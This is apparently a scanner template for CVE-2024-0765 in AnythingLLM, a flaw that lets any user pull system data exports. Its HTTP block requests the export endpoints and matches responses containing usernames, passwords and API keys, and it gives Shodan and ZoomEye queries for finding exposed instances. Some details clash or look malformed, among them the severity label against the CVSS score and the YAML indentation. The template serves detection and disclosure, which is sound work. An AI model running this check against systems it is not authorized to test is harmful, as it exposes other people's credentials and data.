id: CVE-2024-0765

info:
  name: mintplex-labs/anything-llm - Sensitive Data Exposure
  author: May
  severity: critical
 description: |-
    As a default user on a multi-user instance of AnythingLLM, you could execute a call to the `/export-data` endpoint of the system and then unzip and read that export that would enable you do exfiltrate data of the system at that save state.

    This would require the attacked to be granted explicit access to the system, but they can do this at any role. Additionally, post-download, the data is deleted so no evidence would exist that the exfiltration occured.

  impact: |
    Successful exploitation of this vulnerability can lead to unauthorized access to sensitive system information, resulting in potential data breaches, account compromises, and further malicious activities within the affected application or system.

  remediation: |
    - Implement proper access controls and authentication mechanisms to restrict access to sensitive data.
    - Enforce the principle of least privilege and ensure that users only have access to the minimum required data.
    - Encrypt or securely hash sensitive data before storing it in the database.
    - Regularly review and update access controls and data protection mechanisms.

  reference:
    - https://github.com/mintplex-labs/anything-llm/commit/08d33cfd8fc47c5052b6ea29597c964a9da641e2
    - https://huntr.com/bounties/8978ab27-710c-44ce-bfd8-a2ea416dc786
    - https://github.com/fkie-cad/nvd-json-data-feeds

  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2024-0765
    cwe-id: CWE-285

  metadata:
    verified: true
    max-request: 1
    vendor: mintplex-labs
    product: anything-llm
    shodan-query: http.html:"mintplex-labs/anything-llm"
    zoomeye-query: title:"mintplex-labs/anything-llm"

  tags: cve,cve2024,sensitivedata,mintplex

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/system/data-export"
      - "{{BaseURL}}/api/system/data-exports/{{filename}}"
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
      Authorization: Bearer {{admin_auth_token}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "username"
          - "password"
          - "api_key"
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - '"filename":"([^"]+)"'
